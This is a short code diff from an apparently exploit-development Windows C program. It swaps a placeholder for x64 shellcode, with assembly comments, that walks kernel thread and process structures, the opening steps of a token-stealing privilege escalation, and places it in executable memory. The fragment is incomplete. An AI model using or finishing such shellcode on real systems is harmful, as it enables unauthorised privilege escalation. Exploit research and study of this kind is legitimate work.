@@ -115,7 +115,14 @@ int main(){
 
     DWORD PID = GetCurrentProcessId();
 
-    char shellcode[] = "\x48\xC7\xC0\x34\x12\x00\x00\x48\xC7\xC7\x68\x15\x00\x00\x48\x31\xF8";
+    /*
+    mov rdx, gs:[0x188]; 
+    mov rdx, [rdx+0xb8];
+    mov r9, [rdx+0x1d8];
+    mov rcx, r9;
+    */
+
+    char shellcode[] = "\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x48\x8B\x92\xB8\x00\x00\x00\x4C\x8B\x8A\xD8\x01\x00\x00\x4C\x89\xC9";
 
     uintptr_t shellcode_ptr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     memcpy(shellcode_ptr, shellcode, sizeof(shellcode));
